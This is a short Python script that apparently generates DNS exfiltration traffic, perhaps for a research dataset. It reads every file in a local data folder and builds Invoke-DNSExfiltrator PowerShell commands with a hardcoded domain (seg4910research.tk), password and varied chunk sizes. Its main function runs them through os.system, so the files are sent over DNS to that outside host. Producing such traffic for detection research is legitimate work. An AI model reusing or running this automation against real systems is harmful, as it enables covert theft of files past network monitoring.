from os import listdir
from os.path import isfile,join
import random
import os
import threading
def getAllExfiltrateFiles():
    datadirectory = "C:\GithubRepositories\DNSExfiltrator\Data"
    allfiles = [datadirectory+"\\" +f for f in listdir(datadirectory) if isfile(join(datadirectory,f))]
    return allfiles

def fixfilenames():
    file = getAllExfiltrateFiles()
    for filename in file:
        os.rename(filename, filename.replace(" ", "-"))
def generateCommandIteration():
    requestMaxSizeValues = [i for i in range(255,32,-10)]
    labelMaxSize = [i for i in range(63,1,-10)]
    allCombos = [(x,y) for x in requestMaxSizeValues for y in labelMaxSize]
    
    
    return allCombos
def generateCommands(fileList):
    #domainname = "seg4910research.tk"
    #password = "goodmark"
    #b32Flag = False
    
    #requestMaxSize =32-255
    #labelMaxSize = 1-63
    random.seed(100)
    AllCombos = generateCommandIteration()
    FinalSetOfCommands = []
    CommandsForStorage = []
    NBChunks = 0
    counter = 0
    
    for file in fileList:
        
        CommandGenericFile = "Invoke-DNSExfiltrator -i {0} seg4910research.tk  -p goodmark -r {1} -l {2}"
        requestMaxSize = AllCombos[counter%len(AllCombos)][0]
        labelMaxSize = AllCombos[counter%len(AllCombos)][1]

        

        
        CommandGenericFile = CommandGenericFile.format(file,requestMaxSize,labelMaxSize)
        if(random.choices([True,False], weights=[0.2,0.8], k=1)[0]):
            CommandGenericFile = CommandGenericFile+" -b32"
        FinalSetOfCommands.append(CommandGenericFile)
        CommandGenericFile = CommandGenericFile+" \n"
        CommandsForStorage.append(CommandGenericFile)
        counter= counter+1

    with open('AllCommands.txt','a') as file:
        for commands in CommandsForStorage:
            file.write(commands)
            
    return FinalSetOfCommands        
          
def main():
    fileList = getAllExfiltrateFiles()
    finalSet = generateCommands(fileList)
    
    ultimateCommand = "powershell; Import-Module .\Invoke-DNSExfiltrator.ps1;"+";".join(finalSet)   
    os.system(ultimateCommand)
    return ultimateCommand
   
    
   # workers = [threading.Thread(target=worker_func,args=tuple(),name='thread_'+str(i)) for i in range(8)]
    #[worker.start() for worker in workers]
    #[worker.join() for worker in workers]


           
           
       
